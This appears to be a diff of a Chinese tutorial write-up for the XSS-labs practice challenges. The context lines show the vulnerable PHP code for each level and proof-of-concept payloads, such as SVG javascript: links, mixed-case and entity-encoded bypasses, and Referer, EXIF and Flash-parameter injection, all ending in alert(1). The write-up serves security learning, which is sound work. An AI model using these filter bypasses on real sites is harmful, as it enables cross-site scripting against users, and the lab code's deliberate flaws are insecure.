@@ -11225,7 +11225,7 @@ Level 2
 
 
 
-value 属性未转义 → 双引号闭合属性 + 直接注入 
+value 属性未转义 → 双引号闭合属性 + 直接注入 &lt;script&gt;
 
 2. Payload&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
 
@@ -11352,7 +11352,7 @@ strtolower()：把用户传入的整个 payload 全部强制转为小写。且�
 
 
 
-2. payloadWAF拦截了 &lt;script&gt;、所有 onxxx 事件（onclick/onerror/onmouseover全部阵亡）。不能用事件，不能用script标签，就要找不需要on事件触发、不需要script标签的XSS向量。
+2. payloadWAF拦截了 &lt;script&gt;、所有 onxxx 事件（onclick&#x2F;onerror&#x2F;onmouseover全部阵亡）。不能用事件，不能用script标签，就要找不需要on事件触发、不需要script标签的XSS向量。
 核心原理：利用URL 伪协议 javascript:，把 JS 代码写在链接地址里，用户点击链接就执行 JS
 2.1 SVG 触发： SVG + href&quot;&gt;&lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(1)&quot;&gt;&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;click&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;
 
@@ -11432,8 +11432,8 @@ Q1：十进制实体编码构成&amp;#N;
 
 
 N
-ASCII/Unicode十进制数字
-字符对应的编码值，例如j=106，a=97
+ASCII&#x2F;Unicode十进制数字
+字符对应的编码值，例如j&#x3D;106，a&#x3D;97
 
 
 ;
@@ -11470,7 +11470,7 @@ Level 6
 
 1. 大小写绕过&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;script&gt;window.alert = function()  &#123;     confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level7.php?keyword=move up!&quot;; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level6&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;
 
-1.1 分析过滤 &lt;script、 on、src、data、 href  
+1.1 分析过滤 &lt;script、on、src、data、href
 这题和 Level 5 的区别不仅是多过滤了几个字符串，而且没有strtolower()函数，不管大小写。
 
 注意：str_replace是大小写敏感替换！只替换小写字符串，大写、混合大小写不会被处理。
@@ -11481,7 +11481,7 @@ Level 6
 
 1.2 漏洞点str_replace只匹配小写。
 
-on被替换，但 On / ON / oN 不会匹配；
+on被替换，但 On &#x2F; ON &#x2F; oN 不会匹配；
 href小写被替换，HREF、Href不会替换；
 &lt;script小写被替换，&lt;SCRIPT&gt;不会替换。
 
@@ -11543,7 +11543,7 @@ Level 81. 实体编码绕过&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&
 
 1.2 漏洞点&lt;?php  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;?&gt;
 
-输入经过过滤后变成 $str7，然后被原样拼在href=&quot;xxx&quot;——不需要闭合，不需要造新标签，只需要这个网址本身是个伪协议
+输入经过过滤后变成 $str7，然后被原样拼在href&#x3D;”xxx”——不需要闭合，不需要造新标签，只需要这个网址本身是个伪协议
 
 2. payload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&gt;
 
@@ -11559,15 +11559,15 @@ Level 81. 实体编码绕过&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&
 
 Level 9
 
-1. http:// 注入&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;script&gt;window.alert = function()  &#123;     confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level10.php?keyword=well done!&quot;; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level9&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;?phpif(false===strpos($str7,&#x27;http://&#x27;))&#123;  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;        &#125;else&#123;  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;?&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;
+1. http:&#x2F;&#x2F; 注入&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;script&gt;window.alert = function()  &#123;     confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level10.php?keyword=well done!&quot;; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level9&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;?phpif(false===strpos($str7,&#x27;http://&#x27;))&#123;  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;        &#125;else&#123;  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;?&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;
 
-1.1 分析这题和 Level 8 的区别在于输入的字符串里必须出现字面 http://，否则整个输入被丢弃替换。
+1.1 分析这题和 Level 8 的区别在于输入的字符串里必须出现字面 http:&#x2F;&#x2F;，否则整个输入被丢弃替换。
 
-1.2 漏洞点它只检查 http:// 存不存在，不管它在字符串的什么位置。
-所以问题变成：把 http:// 放在哪个位置，既能让 strpos 找到它，又不破坏 javascript:这个伪协议地址本身？
+1.2 漏洞点它只检查 http:&#x2F;&#x2F; 存不存在，不管它在字符串的什么位置。
+所以问题变成：把 http:&#x2F;&#x2F; 放在哪个位置，既能让 strpos 找到它，又不破坏 javascript:这个伪协议地址本身？
 
-可以是注释里的内容（// 后面的部分浏览器根本不当地址解析）
-可以是 JS 字符串参数（alert(&#39;...&#39;) 引号里）
+可以是注释里的内容（&#x2F;&#x2F; 后面的部分浏览器根本不当地址解析）
+可以是 JS 字符串参数（alert(‘…’) 引号里）
 
 
 2. payloadjavas&amp;#99ript:alert(&#x27;http://111&#x27;)
@@ -11602,9 +11602,9 @@ Level 10
 👉 这就叫属性抢夺（抢type），把原本隐藏的input，强行改成普通文本输入框。
 
 Q2：type=&quot;hidden&quot;无法获取焦点，onfocus不会执行
-type=&quot;hidden&quot; → 不渲染在页面上（元素存在，但看不见），不可见元素一律拒绝聚焦 → 点不到、Tab 跳过、autofocus 静默失效 → onfocus永远等不到它的扳机
+type&#x3D;”hidden” → 不渲染在页面上（元素存在，但看不见），不可见元素一律拒绝聚焦 → 点不到、Tab 跳过、autofocus 静默失效 → onfocus永远等不到它的扳机
 
-onfocus事件：只有元素拿到焦点才触发获取焦点两种方式：鼠标点击、autofocus / Tab切换焦点。
+onfocus事件：只有元素拿到焦点才触发获取焦点两种方式：鼠标点击、autofocus &#x2F; Tab切换焦点。
 
 type=&quot;hidden&quot;：浏览器标记为非交互控件，看不见、点不到，autofocus失效，onfocus不会执行。
 所以直接在原hidden框写事件，代码属于死代码，无法弹框。
@@ -11627,7 +11627,7 @@ type=&quot;hidden&quot;：浏览器标记为非交互控件，看不见、点不
 
 
 type=text
-抢夺属性，覆盖后端写死的type=&quot;hidden&quot;，放前面优先生效
+抢夺属性，覆盖后端写死的type&#x3D;”hidden”，放前面优先生效
 
 
 autofocus
@@ -11668,7 +11668,7 @@ Q1：HTTP Referer 请求头
 
 PHP 读取：$_SERVER[&#39;HTTP_REFERER&#39;]
 注意：PHP 里面带下划线 HTTP_REFERER，对应请求头 Referer；HTTP 请求头的横杠 - 在 PHP $_SERVER 中全部转为下划线 _、全部大写。  
-Referer 由浏览器 / 抓包工具生成，攻击者可以随意篡改内容。
+Referer 由浏览器 &#x2F; 抓包工具生成，攻击者可以随意篡改内容。
 服务器拿到 Referer 的值，就直接相信这个字符串，不会校验是不是真实跳转地址。
 
 2. 请求头名字映射规则
@@ -11764,9 +11764,9 @@ Level 14
  由于本关因iframe调用的文件地址失效，无法进行测试。  
 
 
-1. 文件元数据（EXIF）注入某些社交平台的&quot;上传照片后显示拍摄信息&quot;功能曾因为这个漏洞被利用——用户上传一张带恶意EXIF 的照片，所有查看这张照片详情的用户都会中招。
+1. 文件元数据（EXIF）注入某些社交平台的”上传照片后显示拍摄信息”功能曾因为这个漏洞被利用——用户上传一张带恶意EXIF 的照片，所有查看这张照片详情的用户都会中招。
 本地模拟方案：
-实验附件/文件元数据（EXIF）注入附件.zip · Jasmineee007/CyberSecurity - Gitee.com
+实验附件&#x2F;文件元数据（EXIF）注入附件.zip · Jasmineee007&#x2F;CyberSecurity - Gitee.com
 &lt;?phpheader(&#x27;Content-Type: text/html; charset=utf-8&#x27;);echo &#x27;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;本地 EXIF 查看器&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&#x27;;echo &#x27;&lt;h2 align=center&gt;上传图片查看 EXIF&lt;/h2&gt;&#x27;;echo &#x27;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; align=center&gt;&#x27;;echo &#x27;&lt;input type=&quot;file&quot; name=&quot;image&quot; accept=&quot;image/jpeg&quot;&gt;&#x27;;echo &#x27;&lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&#x27;;echo &#x27;&lt;/form&gt;&#x27;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; isset($_FILES[&#x27;image&#x27;])) &#123;    $tmp = $_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;];    echo &#x27;&lt;hr&gt;&lt;h3 align=center&gt;EXIF 元数据（原样回显）&lt;/h3&gt;&#x27;;    echo &#x27;&lt;pre&gt;&#x27;;    $exif = exif_read_data($tmp);    if ($exif === false) &#123;        echo &#x27;图片无 EXIF 数据或不支持的格式&#x27;;    &#125; else &#123;        foreach ($exif as $key =&gt; $section) &#123;            if (is_array($section)) &#123;                foreach ($section as $name =&gt; $val) &#123;                    echo &quot;$key.$name: $val\n&quot;;                &#125;            &#125; else &#123;                echo &quot;$key: $section\n&quot;;            &#125;        &#125;    &#125;    echo &#x27;&lt;/pre&gt;&#x27;;&#125;echo &#x27;&lt;/body&gt;&lt;/html&gt;&#x27;;
 
 
@@ -11788,7 +11788,7 @@ Level 14
 
 
 方式二：Linux 系统 使用 exiftool
-exiftool：Perl 写的元数据读写工具，读取 / 修改 / 删除文件 EXIF、XMP、IPTC 元数据；Kali 自带，misc 图片题高频工具。
+exiftool：Perl 写的元数据读写工具，读取 &#x2F; 修改 &#x2F; 删除文件 EXIF、XMP、IPTC 元数据；Kali 自带，misc 图片题高频工具。
 EXIF：图片附加信息：相机型号、时间、GPS、注释、Artist、Copyright、UserComment 等。  
 
 
@@ -11805,7 +11805,7 @@ EXIF：图片附加信息：相机型号、时间、GPS、注释、Artist、Copy
 
 说明phpStudy 的 PHP 没启用 exif 扩展
 打开 phpStudy → 设置 → 配置文件 → php.ini
-搜索 ;extension=exif（在文件里按 Ctrl+F 查）
+搜索 ;extension&#x3D;exif（在文件里按 Ctrl+F 查）
 把前面那个分号 ; 删掉
 
 
@@ -11940,7 +11940,7 @@ Level 16
 1. 分隔符&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;script&gt;window.alert = function()  &#123;     confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level17.php?arg01=a&amp;arg02=b&quot;; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level16&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;
 
 1.1 分析空格和/、script被封了
-我们的输入落在  元素的文本节点里。
+我们的输入落在 &lt;center&gt; 元素的文本节点里。
 
 
 1.2 漏洞点HTML 语法里属性之间能分隔的还有：换行分隔，URL 里写 %0a
@@ -11958,7 +11958,7 @@ Level 17
 
 
 Q1：xsf是什么？Cross‑Site Flashing，跨站 Flash  
-模式 1：加载外部 SWF 文件（XSF 本体）swf 程序的loadMovie()/loadMovieNum()等函数，URL 参数可控。 攻击者让正常 swf 去加载黑客的恶意 swf 文件；恶意 swf 在沙箱内执行，调用ExternalInterface.call()，实现执行页面 JS，触发 XSS。
+模式 1：加载外部 SWF 文件（XSF 本体）swf 程序的loadMovie()&#x2F;loadMovieNum()等函数，URL 参数可控。 攻击者让正常 swf 去加载黑客的恶意 swf 文件；恶意 swf 在沙箱内执行，调用ExternalInterface.call()，实现执行页面 JS，触发 XSS。
 流程：
 网页嵌入正常swf → url参数控制加载地址 → 加载恶意第三方swf → 恶意swf调用ExternalInterface.call() → 执行JS代码
 
@@ -12002,7 +12002,7 @@ Level 19
 echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;echo &#x27;&lt;embed src=&quot;xsf03.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;
 
 区别在于：这一关的 src 加上了引号。PHP使用htmlspecialchars()，双引号被转义，无法在HTML层闭合src的双引号；空格也被包裹在引号内，不能分割出新属性。
-src=&quot;xsf03.swf? + 我的输入 &quot; ，因此利用 swf 读取 URL 参数，在 Flash 内部渲染恶意 HTML，实现 XSF 攻击。
+src&#x3D;”xsf03.swf? + 我的输入 “ ，因此利用 swf 读取 URL 参数，在 Flash 内部渲染恶意 HTML，实现 XSF 攻击。
 Q1：SWF 如何读取URL查询参数？浏览器访问嵌入swf的地址：
 &lt;embed src=&quot;xsf03.swf?arg01=xxx&amp;arg02=yyy&quot;&gt;
 
@@ -12046,7 +12046,7 @@ Q3：JPEXS Free Flash Decompiler 是什么？1. 基础概念开源、Java编写�
 
 
 2. 核心功能
-✅反编译ActionScript 1/2/3，还原源代码，同时还可以看底层P‑code字节码
+✅反编译ActionScript 1&#x2F;2&#x2F;3，还原源代码，同时还可以看底层P‑code字节码
 ✅查看swf读取url参数逻辑：root.loaderInfo.parameters.xxx
 ✅查找危险函数：ExternalInterface.call()、赋值给htmlText等漏洞点
 ✅提取图片、音频资源；也可以修改代码，重新导出swf文件
@@ -12064,7 +12064,7 @@ sink：污点流向的危险目标函数；source：污染源，这里就是load
 1. htmlText
 风险原理：Flash内部把传入字符串当作HTML渲染
 payload：&lt;a href=&quot;javascript:alert(1)&quot;&gt;
-关键点：Flash的HTML解析残缺，不支持script、onerror；只有少数标签可用（a/b/i/u/font/p/img 这几个)；必须点击a标签才会触发，不能自动跑
+关键点：Flash的HTML解析残缺，不支持script、onerror；只有少数标签可用（a&#x2F;b&#x2F;i&#x2F;u&#x2F;font&#x2F;p&#x2F;img 这几个)；必须点击a标签才会触发，不能自动跑
 
 
 2. ExternalInterface.call(func, arg)
@@ -12095,7 +12095,7 @@ call(&quot;alert&quot;,userInput)
 无法执行任意代码
 
 
-3. getURL / navigateToURL
+3. getURL &#x2F; navigateToURL
 风险原理：做页面跳转，支持javascript:伪协议
 payload：javascript:alert(1)
 关键点：加载就可以自动触发，不用点击；受Flash沙箱、allowScriptAccess策略约束，真实环境容易被拦截
@@ -12103,7 +12103,7 @@ payload：javascript:alert(1)
 4. 总结把JS包装成sink愿意接收的格式：
 
 htmlText → 包装成a标签HTML片段
-ExternalInterface.call → 填函数名 / eval的参数字符串
+ExternalInterface.call → 填函数名 &#x2F; eval的参数字符串
 getURL → 包装成javascript伪协议URL
 
 
@@ -12158,7 +12158,7 @@ package&#123;   import flash.display.LoaderInfo;   import flash.display.Sprite; 
 四个参数：call(&quot;ZeroClipboard.dispatch&quot;, id, &quot;load&quot;, null) ——第 1、3、4位写死，只有 id 是变量。
 2.2 搜 id
 
-2.3 流程?id=值 → flashvars.id → call 的第2参 → 拼进JS源码 → 执行
+2.3 流程?id&#x3D;值 → flashvars.id → call 的第2参 → 拼进JS源码 → 执行
 
 2. payloadQ1：ZeroClipboard 是什么？ZeroClipboard 是一个基于JavaScript和透明Flash实现跨浏览器文本复制的库。
 
@@ -12224,7 +12224,7 @@ width=500&amp;height=500必不可少：缺少宽高参数，swf内部绘制逻�
 
 id如何可控
 直接访问swf，URL查询串作为flashvars
-通过arg01/arg02由PHP解析，塞进embed标签
+通过arg01&#x2F;arg02由PHP解析，塞进embed标签
 
 
 width、height传递
